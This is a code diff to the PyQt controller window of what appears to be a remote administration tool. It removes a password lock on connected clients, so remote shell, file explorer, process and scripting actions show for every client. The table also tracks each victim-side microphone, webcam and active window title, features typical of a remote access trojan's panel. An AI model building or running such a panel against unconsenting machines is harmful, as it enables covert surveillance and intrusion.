@@ -76,9 +76,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))
 
-        # unlocked servers bank
-        self.unlockedSockets = []
-
         # listen status
         self.acceptthreadState = False
 
@@ -96,10 +93,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_os = 4
         self.index_of_user = 5
         self.index_of_privs = 6
-        self.index_of_lock = 7
-        self.index_of_microphone = 8
-        self.index_of_webcamera = 9
-        self.index_of_activeWindowTitle = 10
+        self.index_of_microphone = 7
+        self.index_of_webcamera = 8
+        self.index_of_activeWindowTitle = 9
 
         # initialize online clients table columns width
         self.clientsTable.setColumnWidth(self.index_of_moderator, 100)
@@ -109,7 +105,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.clientsTable.setColumnWidth(self.index_of_os, 100)
         self.clientsTable.setColumnWidth(self.index_of_user, 100)
         self.clientsTable.setColumnWidth(self.index_of_privs, 40)
-        self.clientsTable.setColumnWidth(self.index_of_lock, 40)
         self.clientsTable.setColumnWidth(self.index_of_microphone, 40)
         self.clientsTable.setColumnWidth(self.index_of_webcamera, 40)
 
@@ -141,8 +136,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.viewLogsButton.clicked.connect(self.view_logs)
         self.logSettingsButton.clicked.connect(self.set_logs_settings)
         self.setAliasButton.clicked.connect(self.add_alias)
-        self.lockedButton.clicked.connect(self.unlock_client)
-        self.unlockedButton.clicked.connect(self.lock_client)
         self.updateSourceButton.clicked.connect(self.update_source)
         self.shellButton.clicked.connect(lambda: self.execute_module(module='shell'))
         self.explorerButton.clicked.connect(lambda: self.execute_module(module='explorer'))
@@ -152,8 +145,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.webcamButton.clicked.connect(self.get_webcam_preview)
         self.setModeratorButton.clicked.connect(self.administrator_set_moderator)
 
-        # servers table double click trigger
-        self.clientsTable.doubleClicked.connect(self.unlock_client)
         # Initializing right click menu
         self.clientsTable.setContextMenuPolicy(Qt.CustomContextMenu)
         self.connect(self.clientsTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
@@ -189,7 +180,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'os': '',
             'user': '',
             'privs': '',
-            'lock': '',
             'audio': '',
             'camera': '',
             'title': '',
@@ -286,20 +276,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.filter_privs_combo.currentIndexChanged.connect(self.filter_clients)
         self.clientsTable.setCellWidget(0, self.index_of_privs, self.filter_privs_combo)
 
-        # protection
-        self.filter_lock_combo = QComboBox()
-        self.filter_lock_combo.setEditable(True)
-        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'false.png')), _('FILTER_ALL'), '')
-        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'lock.png')), _('INFO_LOCKED'), 'False')
-        self.filter_lock_combo.addItem(QIcon(os.path.join(assets, 'unlock.png')), _('INFO_UNLOCKED'), 'True')
-        self.filter_lock_combo.setStyleSheet('background-color: #2c3e50;\n'
-                                                 'border: 1px ridge;\n'
-                                                 'border-top: none;\n'
-                                                 'border-right: none;\n'
-                                                 'border-color: #2c3e50;')
-        self.filter_lock_combo.currentIndexChanged.connect(self.filter_clients)
-        self.clientsTable.setCellWidget(0, self.index_of_lock, self.filter_lock_combo)
-
         # Audio
         self.filter_audio_combo = QComboBox()
         self.filter_audio_combo.setEditable(True)
@@ -392,7 +368,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'os': str(self.filter_os_line.text()),
             'user': str(self.filter_user_line.text()),
             'privs': str(self.filter_privs_combo.itemData(self.filter_privs_combo.currentIndex()).toPyObject()),
-            'lock': str(self.filter_lock_combo.itemData(self.filter_lock_combo.currentIndex()).toPyObject()),
             'audio': str(self.filter_audio_combo.itemData(self.filter_audio_combo.currentIndex()).toPyObject()),
             'camera': str(self.filter_camera_combo.itemData(self.filter_camera_combo.currentIndex()).toPyObject()),
             'title': str(self.filter_title_line.text()),
@@ -424,10 +399,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.clientsTable.horizontalHeaderItem(4).setText(_('HEADER_OS'))
         self.clientsTable.horizontalHeaderItem(5).setText(_('HEADER_USER'))
         self.clientsTable.horizontalHeaderItem(6).setText(_('HEADER_PRIVS'))
-        self.clientsTable.horizontalHeaderItem(7).setText(_('HEADER_LOCK'))
-        self.clientsTable.horizontalHeaderItem(8).setText(_('HEADER_MIC'))
-        self.clientsTable.horizontalHeaderItem(9).setText(_('HEADER_CAM'))
-        self.clientsTable.horizontalHeaderItem(10).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))
+        self.clientsTable.horizontalHeaderItem(7).setText(_('HEADER_MIC'))
+        self.clientsTable.horizontalHeaderItem(8).setText(_('HEADER_CAM'))
+        self.clientsTable.horizontalHeaderItem(9).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))
 
         self.offlineClientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
         self.offlineClientsTable.horizontalHeaderItem(1).setText(_('HEADER_ID'))
@@ -518,30 +492,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             else:
                 self.setModeratorButton.setHidden(True)
 
-            if self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
-                self.onlineGroup.setHidden(False)
-                self.viewLogsButton.setHidden(False)
-                self.logSettingsButton.setHidden(False)
-                self.setAliasButton.setHidden(False)
-                self.unlockedButton.setHidden(True)
-                self.lockedButton.setHidden(False)
-                self.updateSourceButton.setHidden(False)
-                self.shellButton.setHidden(True)
-                self.explorerButton.setHidden(True)
-                self.proccessesButton.setHidden(True)
-                self.scriptingButton.setHidden(True)
-            else:
-                self.onlineGroup.setHidden(False)
-                self.viewLogsButton.setHidden(False)
-                self.logSettingsButton.setHidden(False)
-                self.setAliasButton.setHidden(False)
-                self.unlockedButton.setHidden(False)
-                self.lockedButton.setHidden(True)
-                self.updateSourceButton.setHidden(False)
-                self.shellButton.setHidden(False)
-                self.explorerButton.setHidden(False)
-                self.proccessesButton.setHidden(False)
-                self.scriptingButton.setHidden(False)
+            self.onlineGroup.setHidden(False)
+            self.viewLogsButton.setHidden(False)
+            self.logSettingsButton.setHidden(False)
+            self.setAliasButton.setHidden(False)
+            self.updateSourceButton.setHidden(False)
+            self.shellButton.setHidden(False)
+            self.explorerButton.setHidden(False)
+            self.proccessesButton.setHidden(False)
+            self.scriptingButton.setHidden(False)
 
         except:
             self.onlineGroup.setHidden(True)
@@ -696,7 +655,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                 self.filters['os'] in self.streaming_socks[key]['os'] and \
                                 self.filters['user'] in self.streaming_socks[key]['user'] and \
                                 self.filters['privs'] in self.streaming_socks[key]['privileges'] and \
-                                self.filters['lock'] in self.streaming_socks[key]['protection'] and \
                                 self.filters['audio'] in self.streaming_socks[key]['audio_device'] and \
                                 self.filters['camera'] in self.streaming_socks[key]['webcamera_device'] and \
                                 self.filters['title'] in self.streaming_socks[key]['window_title']:
@@ -763,18 +721,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setText(privs_status)
                 self.clientsTable.setItem(index + 1, self.index_of_privs, item)
 
-                # add server lock status
-                lock_status = _('INFO_LOCKED') if online_clients[obj]['protection'] == 'False' else _(
-                    'INFO_UNLOCKED')
-                item = QTableWidgetItem(lock_status)
-                if lock_status == _('INFO_LOCKED'):
-                    item.setTextColor(QColor('#e67e22'))
-                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
-                else:
-                    item.setTextColor(QColor('#2ecc71'))
-                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
-                self.clientsTable.setItem(index + 1, self.index_of_lock, item)
-
                 # add input device
                 item = QTableWidgetItem()
                 if online_clients[obj]['audio_device'] == 'NoDevice':
@@ -834,30 +780,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # update servers online counter
         self.onlineStatus.setText(str(len(online_clients)))
 
-    def unlock_client(self):
-        while 1:
-            client = self.current_client()
-            if client:
-                text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
-                if ok:
-                    _hash = hashlib.md5()
-                    try:
-                        _hash.update(str(text))
-                        answer = data_get(self.connection_socket, _hash.hexdigest(), 'unlockClient', session_id=self.session_id, to=client)
-                        if answer['mode'] == 'loginSuccess':
-                            break
-                        elif answer['mode'] == 'notAuthorized':
-                            continue
-                    except UnicodeEncodeError:
-                        pass
-                else:
-                    break
-
-    def lock_client(self):
-        client = self.current_client()
-        if client:
-            data_send(self.connection_socket, 'lockClient', 'lockClient', self.session_id, client)
-
     def has_microphone(self):
         client = self.current_client()
         if client:
@@ -885,25 +807,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             server_menu.addAction(QIcon(os.path.join(assets, 'unhide.png')), _('RM_VIEW_LOGS'), self.view_logs)
             server_menu.addSeparator()
 
-            if self.clientsTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
-                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
-                                      lambda: self.execute_module('shell'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
-                                      lambda: self.execute_module('explorer'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
-                                      lambda: self.execute_module('processes'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _('RM_SCRIPTING'),
-                                      lambda: self.execute_module('scripting'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
+                                  lambda: self.execute_module('shell'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
+                                  lambda: self.execute_module('explorer'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
+                                  lambda: self.execute_module('processes'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _('RM_SCRIPTING'),
+                                  lambda: self.execute_module('scripting'))
 
-                server_menu.addSeparator()
-                server_menu.addMenu(server_options_menu)
-                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), _('RM_LOCK'),
-                                              self.lock_client)
-                if self.privs == 1:
-                    server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
-                                                  self.terminate_client)
-            else:
-                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), _('RM_UNLOCK'), self.unlock_client)
+            server_menu.addSeparator()
+            server_menu.addMenu(server_options_menu)
+            if self.privs == 1:
+                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
+                                              self.terminate_client)
 
             server_menu.addSeparator()
 
